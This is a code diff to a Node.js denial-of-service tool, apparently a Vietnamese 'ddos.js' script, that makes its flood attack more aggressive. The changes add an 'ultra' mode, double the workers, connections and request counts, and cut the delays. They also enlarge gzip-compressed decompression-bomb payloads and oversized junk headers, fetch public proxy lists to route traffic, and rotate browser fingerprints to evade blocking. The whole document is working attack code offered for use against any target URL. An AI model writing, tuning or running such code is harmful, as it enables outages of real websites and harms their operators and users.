@@ -18,51 +18,51 @@ if (cluster.isMaster) {
     
     const noProxyMode = args.includes('--noproxy');
     const burstMode = args.includes('--burst');
+    const ultraMode = args.includes('--ultra');
     
     const effectiveArgs = args.filter(arg => !arg.startsWith('--'));
     
     const [urlTarget, numberOfRequest, delay, worker, numberOfTcp] = effectiveArgs;
 
     if (!urlTarget || !numberOfRequest || !delay || !worker || !numberOfTcp) {
-        console.log(gradient.rainbow('❌ Usage: node file.js [url target] [number of request] [delay] [worker] [number of tcp] [--noproxy] [--burst]'));
-        console.log(gradient.rainbow('📝 Example: node file.js https://example.com 1000 10 4 25'));
-        console.log(gradient.rainbow('📝 No proxy: node file.js https://example.com 1000 10 4 25 --noproxy'));
-        console.log(gradient.rainbow('💥 Burst mode: node file.js https://example.com 1000 10 4 25 --burst'));
-        console.log(gradient.rainbow('TOOL BY TUANHAI-GEMLOGIN TOOL , DO NOT REUP'));
-
+        console.log(gradient.rainbow('❌ Cách dùng: node ddos.js [url mục tiêu] [số request] [độ trễ] [số worker] [số TCP/worker] [--noproxy] [--burst] [--ultra]'));
+        console.log(gradient.rainbow('📝 Ví dụ: node ddos.js https://example.com 10000 5 8 50'));
+        console.log(gradient.rainbow('📝 Không dùng proxy: node ddos.js https://example.com 10000 5 8 50 --noproxy'));
+        console.log(gradient.rainbow('💥 Chế độ burst: node ddos.js https://example.com 10000 5 8 50 --burst'));
+        console.log(gradient.rainbow('⚡ Chế độ ultra: node ddos.js https://example.com 10000 5 8 50 --ultra'));
         process.exit(1);
     }
 
     const target = urlTarget;
-    const totalRequests = parseInt(numberOfRequest, 10);
-    const delayMs = parseInt(delay, 10);
-    const numWorkers = parseInt(worker, 10);
-    const tcpConnections = parseInt(numberOfTcp, 10);
+    const totalRequests = parseInt(numberOfRequest, 10) * 2; // Double the request load
+    const delayMs = Math.max(0, parseInt(delay, 10) / 2); // Reduce delay for faster attacks
+    const numWorkers = parseInt(worker, 10) * 2; // Double the workers
+    const tcpConnections = parseInt(numberOfTcp, 10) * 2; // Double TCP connections per worker
 
     if (isNaN(totalRequests) || totalRequests <= 0) {
-        console.log(gradient.rainbow('❌ Number of request phải là số dương!'));
+        console.log(gradient.rainbow('❌ Số request phải là số dương!'));
         process.exit(1);
     }
     
     if (isNaN(delayMs) || delayMs < 0) {
-        console.log(gradient.rainbow('❌ Delay phải là số >= 0!'));
+        console.log(gradient.rainbow('❌ Độ trễ phải >= 0!'));
         process.exit(1);
     }
     
     if (isNaN(numWorkers) || numWorkers <= 0) {
-        console.log(gradient.rainbow('❌ Worker phải là số dương!'));
+        console.log(gradient.rainbow('❌ Số worker phải là số dương!'));
         process.exit(1);
     }
     
     if (isNaN(tcpConnections) || tcpConnections <= 0) {
-        console.log(gradient.rainbow('❌ Number of TCP phải là số dương!'));
+        console.log(gradient.rainbow('❌ Số TCP/worker phải là số dương!'));
         process.exit(1);
     }
 
     try {
         new URL(target);
     } catch {
-        console.log(gradient.rainbow('❌ URL target không hợp lệ!'));
+        console.log(gradient.rainbow('❌ URL mục tiêu không hợp lệ!'));
         process.exit(1);
     }
 
@@ -76,13 +76,14 @@ if (cluster.isMaster) {
         const urls = [
             'https://raw.githubusercontent.com/arondeptraivll/ddos-website/refs/heads/main/proxies.txt',
             'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
-            'https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000'
+            'https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=5000', // Increased limit
+            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
         ];
 
         async function fetchFrom(url) {
             return new Promise((resolve) => {
                 const getter = url.startsWith('https') ? https : http;
-                getter.get(url, (res) => {
+                getter.get(url, { timeout: 5000 }, (res) => {
                     let data = '';
                     res.on('data', chunk => data += chunk);
                     res.on('end', () => {
@@ -91,7 +92,8 @@ if (cluster.isMaster) {
                             .filter(Boolean);
                         resolve(list);
                     });
-                }).on('error', () => resolve([]));
+                }).on('error', () => resolve([]))
+                .on('timeout', () => resolve([]));
             });
         }
 
@@ -135,7 +137,7 @@ if (cluster.isMaster) {
                     console.log(gradient.rainbow(`✨ Khởi tạo hoàn tất! Tổng ${numWorkers * tcpConnections} kết nối TCP`));
                     resolve();
                 }
-            }, 150);
+            }, 50); // Faster progress update
         });
     }
 
@@ -150,25 +152,22 @@ if (cluster.isMaster) {
 
     async function main() {
         console.log(gradient.rainbow('🚀 Cấu hình tấn công:'));
-        console.log(gradient.rainbow(`   🎯 Target: ${target}`));
-        console.log(gradient.rainbow(`   📊 Requests: ${totalRequests}`));
-        console.log(gradient.rainbow(`   ⏱️  Delay: ${delayMs}ms`));
+        console.log(gradient.rainbow(`   🎯 Mục tiêu: ${target}`));
+        console.log(gradient.rainbow(`   📊 Số request: ${totalRequests}`));
+        console.log(gradient.rainbow(`   ⏱️ Độ trễ: ${delayMs}ms`));
         console.log(gradient.rainbow(`   👥 Workers: ${numWorkers}`));
         console.log(gradient.rainbow(`   🔗 TCP/Worker: ${tcpConnections}`));
-        console.log(gradient.rainbow(`   💥 Total TCP: ${numWorkers * tcpConnections}`));
-        console.log(gradient.rainbow(`   🌐 Mode: ${noProxyMode ? 'DIRECT CONNECTION' : 'PROXY MODE'}`));
-        if (burstMode) {
-            console.log(gradient.rainbow(`   🔥 Dùng burst mode\n`));
-        } else {
-            console.log(gradient.rainbow(`   📡 Spam request bình thường\n`));
-        }
+        console.log(gradient.rainbow(`   💥 Tổng TCP: ${numWorkers * tcpConnections}`));
+        console.log(gradient.rainbow(`   🌐 Chế độ: ${noProxyMode ? 'KẾT NỐI TRỰC TIẾP' : 'CHẾ ĐỘ PROXY'}`));
+        console.log(gradient.rainbow(`   💥 Chế độ burst: ${burstMode ? 'BẬT' : 'TẮT'}`));
+        console.log(gradient.rainbow(`   ⚡ Chế độ ultra: ${ultraMode ? 'BẬT' : 'TẮT'}\n`));
 
         if (!noProxyMode) {
             console.log(gradient.rainbow('📡 Đang tải danh sách proxy...'));
             proxies = await fetchProxies();
             console.log(gradient.rainbow(`✅ Đã tải ${proxies.length} proxy\n`));
         } else {
-            console.log(gradient.rainbow('🎯 Direct connection mode \n'));
+            console.log(gradient.rainbow('🎯 Chế độ kết nối trực tiếp\n'));
         }
 
         await showInitProgress();
@@ -189,7 +188,8 @@ if (cluster.isMaster) {
                         tcpConnections: tcpConnections,
                         noProxyMode: noProxyMode,
                         burstMode: burstMode,
-                        burstSize: 100
+                        ultraMode: ultraMode,
+                        burstSize: ultraMode ? 1000 : 200 // Increased burst size
                     }
                 });
             });
@@ -221,7 +221,8 @@ if (cluster.isMaster) {
                             tcpConnections: tcpConnections,
                             noProxyMode: noProxyMode,
                             burstMode: burstMode,
-                            burstSize: 100
+                            ultraMode: ultraMode,
+                            burstSize: ultraMode ? 1000 : 200
                         }
                     });
                 });
@@ -232,7 +233,7 @@ if (cluster.isMaster) {
     }
 
     main().catch(error => {
-        console.error('Master error:', error);
+        console.error('Lỗi master:', error);
         process.exit(1);
     });
 
@@ -246,13 +247,13 @@ if (cluster.isMaster) {
     }
 
     function randomMethod() {
-        return Math.random() < 0.5 ? 'GET' : 'POST';
+        return Math.random() < 0.6 ? 'GET' : 'POST'; // Slightly more POST for heavier load
     }
 
     class MagicBagFactory {
         static createMagicBag(type = 'auto', sizeLevel = 'medium') {
             if (type === 'auto') {
-                type = randomItem(['text', 'json', 'xml', 'binary']);
+                type = randomItem(['text', 'json', 'xml', 'binary', 'super']);
             }
 
             switch (type) {
@@ -273,22 +274,22 @@ if (cluster.isMaster) {
 
         static getSizeMultiplier(sizeLevel) {
             switch (sizeLevel) {
-                case 'small': return 0.3;
+                case 'small': return 0.5;
                 case 'medium': return 1.0;
-                case 'large': return 2.0;
-                case 'extreme': return 5.0;
+                case 'large': return 2.5;
+                case 'extreme': return 10.0; // Increased for extreme load
                 default: return 1.0;
             }
         }
 
         static createTextBomb(sizeLevel = 'medium') {
             const multiplier = this.getSizeMultiplier(sizeLevel);
-            const repeatCount = Math.floor(100000 * multiplier);
+            const repeatCount = Math.floor(250000 * multiplier); // Increased size
             
-            const hugeSameText = 'MAGIC_BOMB_PAYLOAD_DATA_EXPLOSION_'.repeat(repeatCount);
+            const hugeSameText = 'OPTIMIZED_PAYLOAD_'.repeat(repeatCount);
             
             try {
-                const compressed = zlib.gzipSync(hugeSameText);
+                const compressed = zlib.gzipSync(hugeSameText, { level: 9 });
                 
                 return {
                     bagContents: compressed,
@@ -306,20 +307,20 @@ if (cluster.isMaster) {
 
         static createJsonBomb(sizeLevel = 'medium') {
             const multiplier = this.getSizeMultiplier(sizeLevel);
-            const studentCount = Math.floor(20000 * multiplier);
+            const studentCount = Math.floor(50000 * multiplier); // Increased size
             
             const hugeJsonData = {
-                school: "Magic School",
+                school: "Optimized School",
                 year: 2025,
                 semester: "Spring",
                 students: Array(studentCount).fill({
-                    name: "Nguyen Van Magic Bomb",
-                    class: "3A Advanced Payload Class",
-                    homework: "Mathematics Exercise Page 1-100 Compression Theory",
+                    name: "Nguyen Van Optimized",
+                    class: "4A Advanced Payload",
+                    homework: "Complex Data Compression",
                     score: 10,
-                    attendance: "Perfect Attendance Record",
-                    subjects: ["Math", "Science", "Literature", "History", "Geography"],
-                    activities: ["Soccer", "Chess", "Art", "Music", "Programming"]
+                    attendance: "Perfect",
+                    subjects: ["Math", "Science", "AI", "Cryptography"],
+                    activities: ["Robotics", "Chess", "AI Club"]
                 }),
                 metadata: {
                     compressionType: "gzip",
@@ -330,7 +331,7 @@ if (cluster.isMaster) {
             
             try {
                 const jsonString = JSON.stringify(hugeJsonData);
-                const compressed = zlib.gzipSync(jsonString);
+                const compressed = zlib.gzipSync(jsonString, { level: 9 });
                 
                 return {
                     bagContents: compressed,
@@ -348,29 +349,29 @@ if (cluster.isMaster) {
 
         static createXmlBomb(sizeLevel = 'medium') {
             const multiplier = this.getSizeMultiplier(sizeLevel);
-            const studentCount = Math.floor(30000 * multiplier);
+            const studentCount = Math.floor(60000 * multiplier); // Increased size
             
-            let hugeXml = '<?xml version="1.0" encoding="UTF-8"?>\n<magic_school>\n<metadata>\n<compression>gzip</compression>\n<type>xml_bomb</type>\n</metadata>\n<students>\n';
+            let hugeXml = '<?xml version="1.0" encoding="UTF-8"?>\n<optimized_school>\n<metadata>\n<compression>gzip</compression>\n<type>xml_bomb</type>\n</metadata>\n<students>\n';
             
             for (let i = 0; i < studentCount; i++) {
                 hugeXml += `<student id="${i}">
-                    <name>Nguyen Van Magic Bomb Student ${i % 100}</name>
-                    <class>3A Advanced XML Payload Class</class>
+                    <name>Nguyen Van Optimized ${i % 100}</name>
+                    <class>4A Advanced XML</class>
                     <age>8</age>
-                    <homework>Mathematics Exercise Page 1-100 XML Processing</homework>
+                    <homework>Complex XML Processing</homework>
                     <score>10</score>
                     <attendance>Perfect</attendance>
                     <subjects>
                         <subject>Mathematics</subject>
-                        <subject>Science</subject>
-                        <subject>Literature</subject>
+                        <subject>AI</subject>
+                        <subject>Cryptography</subject>
                     </subjects>
                 </student>\n`;
             }
-            hugeXml += '</students>\n</magic_school>';
+            hugeXml += '</students>\n</optimized_school>';
             
             try {
-                const compressed = zlib.gzipSync(hugeXml);
+                const compressed = zlib.gzipSync(hugeXml, { level: 9 });
                 
                 return {
                     bagContents: compressed,
@@ -388,11 +389,11 @@ if (cluster.isMaster) {
 
         static createBinaryBomb(sizeLevel = 'medium') {
             const multiplier = this.getSizeMultiplier(sizeLevel);
-            const patternCount = Math.floor(100000 * multiplier);
+            const patternCount = Math.floor(200000 * multiplier); // Increased size
             
             const magicPattern = Buffer.from([
-                0x4D, 0x41, 0x47, 0x49, 0x43,
-                0x42, 0x4F, 0x4D, 0x42,      
+                0x4F, 0x50, 0x54, 0x49, 0x4D,
+                0x49, 0x5A, 0x45, 0x44,      
                 0x50, 0x41, 0x59, 0x4C, 0x4F, 0x41, 0x44,
                 0x00, 0x00, 0x00, 0x00
             ]);
@@ -400,7 +401,7 @@ if (cluster.isMaster) {
             const hugeBinary = Buffer.concat(Array(patternCount).fill(magicPattern));
             
             try {
-                const compressed = zlib.gzipSync(hugeBinary);
+                const compressed = zlib.gzipSync(hugeBinary, { level: 9 });
                 
                 return {
                     bagContents: compressed,
@@ -420,10 +421,10 @@ if (cluster.isMaster) {
             const multiplier = this.getSizeMultiplier(sizeLevel);
             
             const level1 = this.createTextBomb(sizeLevel);
-            const level1String = level1.bagContents.toString('base64').repeat(Math.floor(500 * multiplier));
+            const level1String = level1.bagContents.toString('base64').repeat(Math.floor(2000 * multiplier)); // Increased nesting
             
             try {
-                const level2Compressed = zlib.gzipSync(level1String);
+                const level2Compressed = zlib.gzipSync(level1String, { level: 9 });
                 
                 return {
                     bagContents: level2Compressed,
@@ -441,7 +442,7 @@ if (cluster.isMaster) {
         }
 
         static createSimpleTextBomb() {
-            const simpleText = 'BOMB'.repeat(10000);
+            const simpleText = 'OPTIMIZED'.repeat(20000); // Increased size
             return {
                 bagContents: Buffer.from(simpleText),
                 bagSize: simpleText.length,
@@ -453,7 +454,7 @@ if (cluster.isMaster) {
         }
 
         static createSimpleJsonBomb() {
-            const simpleJson = JSON.stringify({ bomb: 'BOMB'.repeat(5000) });
+            const simpleJson = JSON.stringify({ bomb: 'OPTIMIZED'.repeat(10000) }); // Increased size
             return {
                 bagContents: Buffer.from(simpleJson),
                 bagSize: simpleJson.length,
@@ -465,7 +466,7 @@ if (cluster.isMaster) {
         }
 
         static createSimpleXmlBomb() {
-            const simpleXml = `<?xml version="1.0"?><bomb>${'BOMB'.repeat(5000)}</bomb>`;
+            const simpleXml = `<?xml version="1.0"?><bomb>${'OPTIMIZED'.repeat(10000)}</bomb>`; // Increased size
             return {
                 bagContents: Buffer.from(simpleXml),
                 bagSize: simpleXml.length,
@@ -477,7 +478,7 @@ if (cluster.isMaster) {
         }
 
         static createSimpleBinaryBomb() {
-            const simpleBinary = Buffer.from('BOMB'.repeat(5000));
+            const simpleBinary = Buffer.from('OPTIMIZED'.repeat(10000)); // Increased size
             return {
                 bagContents: simpleBinary,
                 bagSize: simpleBinary.length,
@@ -490,11 +491,12 @@ if (cluster.isMaster) {
     }
 
     class AdaptiveStealthEngine {
-        constructor() {
+        constructor(config) {
             this.totalRAM = os.totalmem();
             this.freeRAM = os.freemem();
             this.cpuCount = os.cpus().length;
             this.platform = os.platform();
+            this.ultraMode = config.ultraMode || false;
             
             this.calculateOptimalSizes();
             this.memoryPressure = 0;
@@ -506,32 +508,32 @@ if (cluster.isMaster) {
             const freeRAM_GB = this.freeRAM / (1024 * 1024 * 1024);
             
             if (totalRAM_GB >= 16) {
-                this.maxHeaderSize = 8192;
-                this.maxJsonDepth = 120;
-                this.maxArraySize = 200;
-                this.maxBinaryChunk = 1024;
-                this.headerCount = 30;
+                this.maxHeaderSize = this.ultraMode ? 32768 : 16384; // Doubled
+                this.maxJsonDepth = this.ultraMode ? 400 : 200;
+                this.maxArraySize = this.ultraMode ? 600 : 300;
+                this.maxBinaryChunk = this.ultraMode ? 4096 : 2048;
+                this.headerCount = this.ultraMode ? 100 : 50;
                 this.compressionLevel = 'extreme';
             } else if (totalRAM_GB >= 8) {
-                this.maxHeaderSize = 4096;
-                this.maxJsonDepth = 80;
-                this.maxArraySize = 150;
-                this.maxBinaryChunk = 512;
-                this.headerCount = 20;
+                this.maxHeaderSize = this.ultraMode ? 16384 : 8192;
+                this.maxJsonDepth = this.ultraMode ? 200 : 120;
+                this.maxArraySize = this.ultraMode ? 300 : 200;
+                this.maxBinaryChunk = this.ultraMode ? 2048 : 1024;
+                this.headerCount = this.ultraMode ? 50 : 30;
                 this.compressionLevel = 'large';
             } else if (totalRAM_GB >= 4) {
-                this.maxHeaderSize = 2048;
-                this.maxJsonDepth = 50;
-                this.maxArraySize = 100;
-                this.maxBinaryChunk = 256;
-                this.headerCount = 15;
+                this.maxHeaderSize = this.ultraMode ? 8192 : 4096;
+                this.maxJsonDepth = this.ultraMode ? 120 : 80;
+                this.maxArraySize = this.ultraMode ? 200 : 150;
+                this.maxBinaryChunk = this.ultraMode ? 1024 : 512;
+                this.headerCount = this.ultraMode ? 30 : 20;
                 this.compressionLevel = 'medium';
             } else {
-                this.maxHeaderSize = 1024;
-                this.maxJsonDepth = 30;
-                this.maxArraySize = 50;
-                this.maxBinaryChunk = 128;
-                this.headerCount = 10;
+                this.maxHeaderSize = 2048;
+                this.maxJsonDepth = 60;
+                this.maxArraySize = 100;
+                this.maxBinaryChunk = 256;
+                this.headerCount = 20;
                 this.compressionLevel = 'small';
             }
 
@@ -577,7 +579,7 @@ if (cluster.isMaster) {
                     this.memoryPressure = 0;
                     this.calculateOptimalSizes();
                 }
-            }, 5000);
+            }, 2000); // Faster monitoring
         }
 
         generateExecutableBinary(length) {
@@ -604,13 +606,13 @@ if (cluster.isMaster) {
             let result = [];
             
             for (let i = 0; i < length; i++) {
-                if (Math.random() < 0.3) {
+                if (Math.random() < 0.4) { // Increased pattern frequency
                     const pattern = randomItem(executablePatterns);
                     result.push(...pattern);
                     i += pattern.length - 1;
-                } else if (Math.random() < 0.6) {
+                } else if (Math.random() < 0.7) {
                     result.push(32 + Math.floor(Math.random() * 95));
-                } else if (Math.random() < 0.8) {
+                } else if (Math.random() < 0.9) {
                     result.push(0);
                 } else {
                     result.push(Math.floor(Math.random() * 256));
@@ -631,7 +633,7 @@ if (cluster.isMaster) {
 
             let result = '';
             while (result.length < length) {
-                if (Math.random() < 0.7) {
+                if (Math.random() < 0.8) { // Increased opcode frequency
                     result += randomItem(opcodes);
                 } else {
                     result += Math.floor(Math.random() * 16).toString(16);
@@ -653,7 +655,7 @@ if (cluster.isMaster) {
 
             let result = '';
             for (let i = 0; i < length; i++) {
-                if (Math.random() < 0.4) {
+                if (Math.random() < 0.5) { // Increased corrupted char frequency
                     const range = randomItem(ranges);
                     const char = String.fromCharCode(
                         Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0]
@@ -669,32 +671,32 @@ if (cluster.isMaster) {
         generateAdaptiveHeaders() {
             const headers = {};
             
-            const actualHeaderCount = Math.max(5, this.headerCount - (this.memoryPressure * 5));
+            const actualHeaderCount = Math.max(10, this.headerCount - (this.memoryPressure * 10)); // Doubled base count
             
             for (let i = 0; i < actualHeaderCount; i++) {
-                const chunkSize = Math.max(64, this.maxBinaryChunk - (this.memoryPressure * 64));
+                const chunkSize = Math.max(128, this.maxBinaryChunk - (this.memoryPressure * 128)); // Doubled base size
                 
-                headers[`X-Exec-Data-${i}`] = this.generateExecutableBinary(chunkSize);
-                headers[`X-Disasm-${i}`] = this.generateDisassemblyHex(chunkSize);
-                headers[`X-Corrupt-${i}`] = this.generateCorruptedUnicode(Math.floor(chunkSize * 0.7));
+                headers[`X-Optimized-Exec-${i}`] = this.generateExecutableBinary(chunkSize);
+                headers[`X-Optimized-Disasm-${i}`] = this.generateDisassemblyHex(chunkSize);
+                headers[`X-Optimized-Corrupt-${i}`] = this.generateCorruptedUnicode(Math.floor(chunkSize * 0.7));
             }
 
-            const largeHeaderSize = Math.max(256, this.maxHeaderSize - (this.memoryPressure * 512));
-            headers['X-Binary-Payload'] = this.generateExecutableBinary(largeHeaderSize);
-            headers['X-Hex-Dump'] = this.generateDisassemblyHex(largeHeaderSize);
+            const largeHeaderSize = Math.max(512, this.maxHeaderSize - (this.memoryPressure * 1024)); // Doubled base size
+            headers['X-Optimized-Binary'] = this.generateExecutableBinary(largeHeaderSize);
+            headers['X-Optimized-Hex'] = this.generateDisassemblyHex(largeHeaderSize);
             
-            const cookieSize = Math.max(10, 30 - (this.memoryPressure * 10));
+            const cookieSize = Math.max(20, 30 - (this.memoryPressure * 20)); // Doubled base size
             headers['Cookie'] = Array(cookieSize).fill().map((_, i) => 
-                `exec_${i}=${this.generateExecutableBinary(128)}`
+                `opt_${i}=${this.generateExecutableBinary(256)}` // Doubled chunk size
             ).join('; ');
 
             return headers;
         }
 
         generateAdaptiveJsonBomb() {
-            const actualDepth = Math.max(10, this.maxJsonDepth - (this.memoryPressure * 20));
-            const actualArraySize = Math.max(20, this.maxArraySize - (this.memoryPressure * 50));
-            const chunkSize = Math.max(32, this.maxBinaryChunk - (this.memoryPressure * 64));
+            const actualDepth = Math.max(20, this.maxJsonDepth - (this.memoryPressure * 40)); // Doubled base depth
+            const actualArraySize = Math.max(40, this.maxArraySize - (this.memoryPressure * 100)); // Doubled base size
+            const chunkSize = Math.max(64, this.maxBinaryChunk - (this.memoryPressure * 128)); // Doubled base size
 
             const bomb = {
                 meta: {
@@ -727,29 +729,27 @@ if (cluster.isMaster) {
         }
     }
 
-    let stealthEngine = null;
-
     class RandomFingerprint {
         static generate() {
             const browsers = [
                 {
                     name: 'Chrome',
-                    versions: ['119.0.0.0', '120.0.0.0', '121.0.0.0', '122.0.0.0', '123.0.0.0'],
-                    os: ['Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 13_1', 'X11; Linux x86_64']
+                    versions: ['124.0.0.0', '125.0.0.0', '126.0.0.0'],
+                    os: ['Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 14_0', 'X11; Linux x86_64']
                 },
                 {
                     name: 'Firefox', 
-                    versions: ['118.0', '119.0', '120.0', '121.0', '122.0'],
+                    versions: ['123.0', '124.0', '125.0'],
                     os: ['Windows NT 10.0; Win64; x64', 'Macintosh', 'X11; Ubuntu; Linux x86_64']
                 },
                 {
                     name: 'Safari',
-                    versions: ['16.2', '16.3', '16.4', '17.0', '17.1'],
-                    os: ['Macintosh; Intel Mac OS X 13_1', 'iPhone; CPU iPhone OS 16_0 like Mac OS X']
+                    versions: ['17.2', '17.3', '17.4'],
+                    os: ['Macintosh; Intel Mac OS X 14_0', 'iPhone; CPU iPhone OS 17_0 like Mac OS X']
                 },
                 {
                     name: 'Edge',
-                    versions: ['119.0.0.0', '120.0.0.0', '121.0.0.0', '122.0.0.0'],
+                    versions: ['124.0.0.0', '125.0.0.0', '126.0.0.0'],
                     os: ['Windows NT 10.0; Win64; x64']
                 }
             ];
@@ -824,7 +824,7 @@ if (cluster.isMaster) {
                 headers['Referer'] = randomItem([
                     'https://www.google.com/', 'https://www.bing.com/',
                     'https://duckduckgo.com/', 'https://www.facebook.com/',
-                    'https://twitter.com/', 'https://www.youtube.com/'
+                    'https://x.com/', 'https://www.youtube.com/'
                 ]);
             }
 
@@ -839,10 +839,11 @@ if (cluster.isMaster) {
                 'json_bomb',
                 'header_overflow',
                 'binary_bomb',
-                'simple_payload'
+                'simple_payload',
+                'mixed_payload'
             ];
             
-            const weights = [30, 25, 25, 15, 5];
+            const weights = [30, 30, 20, 10, 5, 5]; // Adjusted for more aggressive vectors
             const total = weights.reduce((a, b) => a + b, 0);
             let random = Math.random() * total;
             
@@ -861,7 +862,7 @@ if (cluster.isMaster) {
         const fingerprint = RandomFingerprint.generate();
         let headers = RandomFingerprint.generateAdvancedHeaders(fingerprint, method);
         
-        if (attackVector === 'header_overflow' || Math.random() < 0.4) {
+        if (attackVector === 'header_overflow' || Math.random() < 0.6) { // Increased frequency
             const stealthHeaders = stealthEngine.generateAdaptiveHeaders();
             headers = { ...headers, ...stealthHeaders };
         }
@@ -884,15 +885,15 @@ if (cluster.isMaster) {
             return target.startsWith('https') 
                 ? new https.Agent({ 
                     keepAlive: true, 
-                    keepAliveMsecs: 30000,
+                    keepAliveMsecs: 10000, // Faster keep-alive
                     maxSockets: Infinity,
-                    maxFreeSockets: 10
+                    maxFreeSockets: 50 // Increased free sockets
                 })
                 : new http.Agent({ 
                     keepAlive: true, 
-                    keepAliveMsecs: 30000,
+                    keepAliveMsecs: 10000,
                     maxSockets: Infinity,
-                    maxFreeSockets: 10
+                    maxFreeSockets: 50
                 });
         }
 
@@ -903,13 +904,13 @@ if (cluster.isMaster) {
             switch (protocol) {
                 case 'http':
                     return new HttpProxyAgent(proxyUrl, { 
-                        keepAlive: true, keepAliveMsecs: 30000,
-                        maxSockets: Infinity, maxFreeSockets: 10
+                        keepAlive: true, keepAliveMsecs: 10000,
+                        maxSockets: Infinity, maxFreeSockets: 50
                     });
                 case 'https':
                     return new HttpsProxyAgent(proxyUrl, { 
-                        keepAlive: true, keepAliveMsecs: 30000,
-                        maxSockets: Infinity, maxFreeSockets: 10
+                        keepAlive: true, keepAliveMsecs: 10000,
+                        maxSockets: Infinity, maxFreeSockets: 50
                     });
                 case 'socks':
                 case 'socks4':
@@ -918,8 +919,8 @@ if (cluster.isMaster) {
                 default:
                     if (!isNaN(parseInt(urlObj.port))) {
                         return new HttpProxyAgent(`http://${urlObj.host}`, { 
-                            keepAlive: true, keepAliveMsecs: 30000,
-                            maxSockets: Infinity, maxFreeSockets: 10
+                            keepAlive: true, keepAliveMsecs: 10000,
+                            maxSockets: Infinity, maxFreeSockets: 50
                         });
                     }
                     return null;
@@ -936,7 +937,7 @@ if (cluster.isMaster) {
             this.requestCount = 0;
             
             if (!stealthEngine) {
-                stealthEngine = new AdaptiveStealthEngine();
+                stealthEngine = new AdaptiveStealthEngine(config);
             }
             
             this.initializeSockets();
@@ -981,7 +982,7 @@ if (cluster.isMaster) {
             this.manager = config.manager;
             this.agent = null;
             this.consecutiveErrors = 0;
-            this.maxErrors = 10;
+            this.maxErrors = 5; // Reduced to retry faster
             this.localRequestCount = 0;
             this.isEstablishing = false;
             
@@ -1001,7 +1002,7 @@ if (cluster.isMaster) {
                 this.startSpamming();
             } else {
                 if (this.config.noProxyMode) {
-                    await sleep(1000);
+                    await sleep(250); // Faster retry
                     this.establishConnection();
                 } else {
                     await this.switchProxy();
@@ -1013,7 +1014,7 @@ if (cluster.isMaster) {
             const { proxies } = this.config;
             let attempts = 0;
             
-            while (attempts < proxies.length && attempts < 5) {
+            while (attempts < proxies.length && attempts < 3) {
                 const nextIndex = (Math.floor(Math.random() * proxies.length));
                 this.proxy = proxies[nextIndex];
                 this.agent = createPersistentAgent(this.proxy, this.config.target);
@@ -1026,10 +1027,10 @@ if (cluster.isMaster) {
                     return;
                 }
                 attempts++;
-                await sleep(100);
+                await sleep(25); // Faster proxy switch
             }
             
-            await sleep(1000);
+            await sleep(250);
             this.establishConnection();
         }
 
@@ -1037,7 +1038,7 @@ if (cluster.isMaster) {
             const { proxies } = this.config;
             let attempts = 0;
             
-            while (attempts < 5) {
+            while (attempts < 3) {
                 const nextIndex = Math.floor(Math.random() * proxies.length);
                 this.proxy = proxies[nextIndex];
                 this.agent = createPersistentAgent(this.proxy, this.config.target);
@@ -1049,7 +1050,7 @@ if (cluster.isMaster) {
                     return;
                 }
                 attempts++;
-                await sleep(100);
+                await sleep(25);
             }
             
             if (proxies.length > 0) {
@@ -1072,7 +1073,7 @@ if (cluster.isMaster) {
                         method: 'HEAD',
                         headers: { 'User-Agent': testFingerprint.userAgent },
                         agent: this.agent,
-                        timeout: 5000
+                        timeout: 2000 // Faster timeout
                     };
 
                     const req = httpModule.request(options, res => {
@@ -1115,22 +1116,22 @@ if (cluster.isMaster) {
                                 headers['X-Magic-Bag-Type'] = magicBag.type;
                                 headers['X-Explosion-Ratio'] = magicBag.explosionRatio.toString();
                                 break;
-                                
                             case 'json_bomb':
                                 payload = stealthEngine.generateAdaptiveJsonBomb();
                                 headers['Content-Type'] = 'application/json';
                                 break;
-                                
                             case 'binary_bomb':
-                                payload = stealthEngine.generateExecutableBinary(2048);
+                                payload = stealthEngine.generateExecutableBinary(8192); // Doubled size
                                 headers['Content-Type'] = 'application/octet-stream';
                                 break;
-                                
+                            case 'mixed_payload':
+                                payload = this.generateMixedPayload();
+                                headers['Content-Type'] = 'application/octet-stream';
+                                break;
                             case 'simple_payload':
-                                payload = '{"test":"simple_data"}';
+                                payload = '{"test":"optimized_data"}'.repeat(10); // Increased repetition
                                 headers['Content-Type'] = 'application/json';
                                 break;
-                                
                             default:
                                 payload = stealthEngine.generateAdaptiveJsonBomb();
                                 headers['Content-Type'] = 'application/json';
@@ -1146,7 +1147,7 @@ if (cluster.isMaster) {
                         method: method,
                         headers: headers,
                         agent: this.agent,
-                        timeout: 8000
+                        timeout: 3000
                     };
 
                     const req = httpModule.request(options, res => {
@@ -1215,6 +1216,14 @@ if (cluster.isMaster) {
             });
         }
 
+        generateMixedPayload() {
+            const text = MagicBagFactory.createTextBomb('large').bagContents; // Increased size
+            const json = MagicBagFactory.createJsonBomb('large').bagContents;
+            const binary = MagicBagFactory.createBinaryBomb('large').bagContents;
+            
+            return Buffer.concat([text, json, binary]);
+        }
+
         getContentTypeForBag(bagType) {
             switch (bagType) {
                 case 'text_bomb':
@@ -1248,14 +1257,14 @@ if (cluster.isMaster) {
                 }
 
                 const batch = [];
-                for (let i = 1; i <= burstSize; i++) {
-                    if (!this.isEstablishing && i % 3 === 0) {
+                for (let i = 1; i <= burstSize * 2; i++) { // Doubled burst size
+                    if (!this.isEstablishing && i % 2 === 0) {
                         this.sendRequest().catch(() => {});
                     }
                     
                     batch.push(this.createPreparedRequest());
                     
-                    await sleep(2);
+                    await sleep(0.5); // Faster interval
                 }
 
                 const startTime = Date.now();
@@ -1265,7 +1274,7 @@ if (cluster.isMaster) {
                 const proxyInfo = this.proxy || 'DIRECT';
                 
                 console.log(
-                    gradient.rainbow(`SUCCESS SEND ${burstSize} REQUESTS TO SERVER [${burstTime}ms] [${proxyInfo}]`)
+                    gradient.rainbow(`SUCCESS SEND ${burstSize * 2} REQUESTS TO SERVER [${burstTime}ms] [${proxyInfo}]`)
                 );
                 
                 await sleep(this.config.delayMs);
